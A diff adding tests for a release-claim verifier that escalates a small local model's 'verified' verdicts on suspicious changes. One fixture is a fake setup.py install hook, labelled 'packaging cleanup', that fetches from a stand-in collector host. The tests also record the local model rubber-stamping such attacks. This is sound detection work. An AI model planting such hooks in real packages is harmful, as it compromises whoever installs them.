@@ -195,6 +195,127 @@ test("escalation engine overrides release-critical local verdicts", async () => 
   assert.equal(result.reasoning, "token validation added");
 });
 
+function releaseData(files: Array<{ path: string; patch: string }>) {
+  return {
+    repoLabel: "t/t",
+    baseRef: "v1",
+    headRef: "v2",
+    notes: "",
+    commits: [] as Commit[],
+    files: files.map((f) => ({
+      path: f.path,
+      status: "modified",
+      additions: 3,
+      deletions: 1,
+      patch: f.patch,
+    })),
+    commitFiles: async () => [],
+    warnings: [] as string[],
+  };
+}
+
+test("setup.py shape: local 'verified' under a non-security section escalates", async () => {
+  // The 9B rubber-stamped an install hook as "Packaging cleanup" under
+  // "What's Changed" — no advisory, no Security section, so the old
+  // claim-only trigger would not have escalated.
+  const data = releaseData([
+    {
+      path: "setup.py",
+      patch:
+        '@@ -10,3 +10,9 @@ setup(\n+# packaging cleanup\n+class PostInstall(install):\n+    def run(self):\n+        urllib.request.urlopen("https://collector.example/p").read()\n+        install.run(self)\n+    cmdclass={"install": PostInstall},\n',
+    },
+  ]);
+  let escalations = 0;
+  const local = {
+    name: "local",
+    judge: async () =>
+      '{"verdict":"verified","confidence":0.9,"files":[],"reasoning":"routine packaging changes"}',
+  };
+  const strong = {
+    name: "strong",
+    judge: async () => {
+      escalations++;
+      return '{"verdict":"contradicted","confidence":0.95,"files":["setup.py"],"reasoning":"install hook fetches remote code"}';
+    },
+  };
+  const [result] = await verifyClaims(data, [claim("Packaging cleanup")], {
+    judgeMode: "all", engine: local, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
+  });
+  assert.equal(escalations, 1);
+  assert.equal(result.verdict, "contradicted");
+  assert.ok(result.evidence.methods.includes("escalated"));
+});
+
+test("a 'verified' on non-sensitive paths does not escalate", async () => {
+  const data = releaseData([
+    { path: "src/markdown.ts", patch: "@@ -1,1 +1,2 @@\n+export const tableAlign = 'left';\n" },
+  ]);
+  let escalations = 0;
+  const local = {
+    name: "local",
+    judge: async () =>
+      '{"verdict":"verified","confidence":0.9,"files":["src/markdown.ts"],"reasoning":"alignment constant added"}',
+  };
+  const strong = {
+    name: "strong",
+    judge: async () => {
+      escalations++;
+      return '{"verdict":"verified","confidence":0.9,"files":[],"reasoning":"unused"}';
+    },
+  };
+  const [result] = await verifyClaims(data, [claim("Improve markdown table alignment")], {
+    judgeMode: "all", engine: local, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
+  });
+  assert.equal(escalations, 0);
+  assert.equal(result.verdict, "verified");
+  assert.ok(!result.evidence.methods.includes("escalated"));
+});
+
+test("every attack-shape golden case escalates a rubber-stamped local 'verified'", async () => {
+  const { readFile } = await import("node:fs/promises");
+  const golden = JSON.parse(
+    await readFile(new URL("./eval/golden.json", import.meta.url), "utf8"),
+  ) as Array<{ name: string; section: string; claim: string; hunks: Array<{ path: string; hunk: string }> }>;
+  const attackShapes = [
+    "fabricated-feature-vs-unrelated-migration",
+    "js-lockfile-nonregistry-source",
+    "setup-py-install-hook-vs-cleanup-claim",
+    "go-module-source-rename-vs-update-claim",
+    "version-claim-vs-actual-bump",
+  ];
+  for (const name of attackShapes) {
+    const gcase = golden.find((g) => g.name === name);
+    assert.ok(gcase, `golden case ${name} missing`);
+    const data = releaseData(gcase.hunks.map((h) => ({ path: h.path, patch: h.hunk })));
+    const cl = claim(gcase.claim);
+    cl.section = gcase.section;
+    let escalations = 0;
+    const rubberStamp = {
+      name: "local-9b",
+      judge: async () =>
+        JSON.stringify({
+          verdict: "verified",
+          confidence: 0.9,
+          files: gcase.hunks.map((h) => h.path),
+          reasoning: "looks fine",
+        }),
+    };
+    const strong = {
+      name: "strong",
+      judge: async () => {
+        escalations++;
+        return '{"verdict":"contradicted","confidence":0.95,"files":[],"reasoning":"malicious change"}';
+      },
+    };
+    const [result] = await verifyClaims(data, [cl], {
+      judgeMode: "all", engine: rubberStamp, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
+    });
+    assert.equal(escalations, 1, `${name}: expected exactly one escalation call`);
+    assert.equal(result.verdict, "contradicted", name);
+    assert.ok(result.evidence.methods.includes("escalated"), name);
+  }
+});
+
 test("parseSurplusOutput validates and caps items", () => {
   const items = parseSurplusOutput(
     'noise {"surplus":[{"description":"new endpoint /admin","file":"src/api.rs","notable":true},{"description":"comment fix","file":"a.rs","notable":false}],"reasoning":"x"} tail',
